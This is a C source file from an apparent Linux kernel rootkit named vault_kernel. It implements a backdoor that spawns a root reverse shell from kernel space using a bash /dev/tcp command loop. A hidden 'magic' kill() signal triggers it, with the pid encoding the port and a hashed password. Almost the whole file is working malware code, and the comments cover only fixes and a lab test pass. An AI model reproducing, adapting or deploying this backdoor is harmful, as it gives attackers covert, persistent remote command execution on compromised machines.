/* vault_kernel - backdoor.c
 * Kernel backdoor: reverse shell via call_usermodehelper()
 * Magic packet trigger via kill(pid, MAGIC_SIGNAL) where `pid`
 * encodes: (port << 16) | fnv1a16(magic_word).
 *
 * NOTE on MAGIC_SIGNAL: userland `kill(2)` from glibc uses signal
 * numbers where SIGRTMIN == 34 on x86_64 (glibc reserves 32/33),
 * so SIGRTMIN+1 arrives at the syscall as 35.  The kernel-side
 * SIGRTMIN constant is 32 and must NOT be used here — the original
 * implementation compared against 33 and could never fire.
 * ruby570bocadito © 2026
 */
#include "core.h"

static char magic_str[16] = {0};
static int magic_enabled = 0;

/* glibc SIGRTMIN (34) + 1 — the value userspace actually sends */
#define MAGIC_SIGNAL 35
#define MAGIC_PORT(p) (((p) >> 16) & 0xFFFF)
#define MAGIC_FLAG(p) ((p) & 0xFFFF)

/*
 * FNV-1a 32-bit folded to 16 bits.  MUST stay in sync with the
 * FNV1a16() implementation in client/go/internal/vaultkernel/ioctl.go
 * and the Python CLI.
 */
uint16_t vault_fnv1a16(const char *s) {
    uint32_t h = 0x811C9DC5u;

    while (*s) {
        h ^= (unsigned char)*s++;
        h *= 0x01000193u;
    }
    return (uint16_t)((h >> 16) ^ (h & 0xFFFFu));
}

static int reverse_shell_spawn(const char *ip, int port) {
    char *argv[] = { "/bin/bash", "-c", NULL, NULL };
    static char *envp[] = { "HOME=/", "PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL };
    char cmd[256];

    /* Use bash -c with /dev/tcp for reverse shell */
    snprintf(cmd, sizeof(cmd),
             "exec 5<>/dev/tcp/%s/%d; cat <&5 | while read line; do $line 2>&5 >&5; done &",
             ip, port);

    argv[2] = cmd;

    pr_info(VAULT_KERNEL_TAG " spawning reverse shell -> %s:%d\n", ip, port);

    /*
     * UMH_WAIT_EXEC is MANDATORY here: it blocks until the execve has
     * consumed argv/envp.  The previous UMH_NO_WAIT returned before the
     * helper thread ran, so the kernel later dereferenced `cmd` and
     * `argv` after this stack frame died — a classic use-after-free in
     * kernel space (v3.2 bug, found in the v3.3 lab pass).
     */
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

/* Wrapper for workqueue-based spawning (safer) */
struct backdoor_work {
    struct work_struct work;
    char ip[64];
    int port;
};

static void backdoor_worker(struct work_struct *work) {
    struct backdoor_work *bw = container_of(work, struct backdoor_work, work);
    reverse_shell_spawn(bw->ip, bw->port);
    kfree(bw);
}

int backdoor_spawn_reverse_shell(const char *ip, int port) {
    struct backdoor_work *bw;

    bw = kmalloc(sizeof(*bw), GFP_KERNEL);
    if (!bw)
        return -ENOMEM;

    strncpy(bw->ip, ip, sizeof(bw->ip) - 1);
    bw->ip[sizeof(bw->ip) - 1] = '\0';
    bw->port = port;

    INIT_WORK(&bw->work, backdoor_worker);
    schedule_work(&bw->work);

    return 0;
}

int backdoor_trigger_shell(const char *ip, const char *port_str) {
    int port;
    if (kstrtoint(port_str, 10, &port))
        return -EINVAL;
    if (port < 1 || port > 65535)
        return -EINVAL;
    return backdoor_spawn_reverse_shell(ip, port);
}

int backdoor_set_magic(const char *magic) {
    strncpy(magic_str, magic, sizeof(magic_str) - 1);
    magic_str[sizeof(magic_str) - 1] = '\0';
    if (!magic_str[0]) {
        magic_enabled = 0;
        pr_info(VAULT_KERNEL_TAG " magic packet backdoor disabled\n");
        return 0;
    }
    magic_enabled = 1;
    pr_info(VAULT_KERNEL_TAG " magic packet backdoor enabled (word hash 0x%04x)\n",
            vault_fnv1a16(magic_str));
    return 0;
}

/*
 * Check if a kill() call matches the magic packet pattern.
 * Pattern: kill(pid, 35) where
 *   pid = (port << 16) | fnv1a16(magic_word)
 * The word is set with `vault_kernel magic <word>`; the CLI's
 * `magic-encode <word> <port>` command prints the ready-to-run
 * kill() incantation.
 */
int backdoor_check_magic(pid_t pid, int sig) {
    int port;

    if (!magic_enabled)
        return 0;

    if (sig != MAGIC_SIGNAL)
        return 0;

    if (MAGIC_FLAG(pid) != vault_fnv1a16(magic_str))
        return 0;

    port = MAGIC_PORT(pid);
    if (port < 1 || port > 65535)
        return 0;

    pr_info(VAULT_KERNEL_TAG " magic packet received, spawning shell on port %d\n", port);

    /* Spawn reverse shell to localhost:port */
    backdoor_spawn_reverse_shell("127.0.0.1", port);

    return 1; /* Signal handled — do not propagate */
}

int backdoor_init(void) {
    pr_info(VAULT_KERNEL_TAG " backdoor initialized\n");
    return 0;
}

void backdoor_cleanup(void) {
    magic_enabled = 0;
    memset(magic_str, 0, sizeof(magic_str));
    pr_info(VAULT_KERNEL_TAG " backdoor cleaned\n");
}
